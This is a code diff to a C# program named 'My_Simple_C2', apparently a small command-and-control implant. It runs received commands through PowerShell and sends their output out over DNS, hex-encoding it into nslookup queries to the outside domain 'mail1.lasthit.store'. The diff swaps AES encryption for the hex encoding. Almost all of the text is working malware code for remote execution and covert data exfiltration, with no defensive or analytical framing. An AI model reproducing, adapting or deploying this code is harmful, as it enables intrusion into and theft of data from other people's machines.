@@ -17,35 +17,16 @@ namespace My_Simple_C2
             byte[] base64Bytes = Convert.FromBase64String(base64Encoded);
             return Encoding.UTF8.GetString(base64Bytes);
         }
-        public static string Encrypt(string plainText, string key)
+        public static string Encrypt(string input)
         {
-            byte[] iv = new byte[16]; 
-            byte[] array;
-            key = key.PadRight(16, '\0');
-
-            using (Aes aes = Aes.Create())
+            StringBuilder hex = new StringBuilder();
+            foreach (char c in input)
             {
-                aes.Key = Encoding.UTF8.GetBytes(key);
-                aes.IV = iv;
-
-                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
-
-                using (MemoryStream memoryStream = new MemoryStream())
-                {
-                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
-                    {
-                        using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
-                        {
-                            streamWriter.Write(plainText);
-                        }
-
-                        array = memoryStream.ToArray();
-                    }
-                }
+                hex.AppendFormat("{0:x2}", (int)c);
             }
-
-            return Convert.ToBase64String(array);
+            return hex.ToString();
         }
+
         static void Main(string[] args)
         {
             string key = "m123asdw";
@@ -69,7 +50,7 @@ namespace My_Simple_C2
                     Collection<PSObject> PSOutput2;
                     PSOutput2 = ps.AddScript(Command).Invoke();
                     String command_output = PSOutput2[0].ToString();
-                    String command_send = Encrypt(command_output, key); ;
+                    String command_send = Encrypt(command_output).Replace("=", ""); ;
                     String send_data = "$command = \"nslookup\";$arguments = \"minhhh" + command_send + "minhhh.mail1.lasthit.store\";$process = Start-Process -FilePath $command -ArgumentList $arguments -NoNewWindow -PassThru;$process | Wait-Process -Timeout 1 -ErrorAction SilentlyContinue;if (!$process.HasExited) {$process | Stop-Process -Force}";
                     ps.AddScript(send_data).Invoke();
                 }
